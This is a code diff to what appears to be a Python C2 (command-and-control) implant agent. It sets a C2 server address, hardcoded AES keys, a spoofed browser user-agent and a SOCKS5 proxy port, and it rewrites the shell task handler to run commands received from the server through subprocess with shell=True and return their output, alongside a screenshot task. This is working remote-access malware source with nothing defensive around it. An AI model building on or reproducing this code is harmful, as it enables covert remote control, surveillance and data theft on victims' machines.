@@ -30,11 +30,11 @@ import xml.etree.ElementTree as ET
 # ======================
 class Config:
     def __init__(self):
-        self.C2_SERVER = "https://192.168.16.78:443"
+        self.C2_SERVER = "https://10.10.8.3:443"
         self.AES_KEY = b"32bytekey-ultra-secure-123456789"
         self.AES_IV = b"16byteiv-9876543"
         self.USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-        self.CHECKIN_INTERVAL = 60
+        self.CHECKIN_INTERVAL = 10
         self.SOCKS5_PORT = 1080
         self.MAX_UPLOAD_SIZE = 10 * 1024 * 1024
         self.DEBUG = True
@@ -649,20 +649,49 @@ class Agent:
         try:
             task_type = task.get("type")
             
+            
             if task_type == "shell":
-                result = SystemUtils.execute_command(task.get("command", ""))
+                command = task.get("cmd", "")
+                if not command:  # Get command from task_data if not in root
+                    task_data = task.get("data", {})
+                    command = task_data.get("cmd", "")
+                   
+                print(f"[AGENT] Executing: {command}")  # Debug
                 
-                # Add proper terminal output handling
-                if task.get("terminal", False):
+                # Enhanced subprocess execution
+                result = subprocess.run(
+                    command,
+                    shell=True,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    text=True,
+                    encoding='utf-8',
+                    errors='replace',
+                    timeout=30
+                )
+                
+                output = result.stdout.strip()
+                error = result.stderr.strip()
+                
+                print(f"[AGENT] Output: {output}")  # Debug
+                print(f"[AGENT] Error: {error}")    # Debug
+                
+                if task.get("terminal", False) or task.get("data", {}).get("terminal", False):
                     return {
                         "status": "success",
-                        "output": result.get("output", ""),
-                        "error": result.get("error", ""),
+                        "output": output if output else "Command executed successfully",
+                        "error": error,
                         "terminal": True,
-                        "task_id": task.get("task_id")  # Echo back the task_id
+                        "task_id": task.get("task_id")
                     }
-                return result
-            
+                
+                return {
+                    "output": output,
+                    "error": error,
+                    "returncode": result.returncode
+                }
+                        
+              
 
             
             elif task_type == "screenshot":
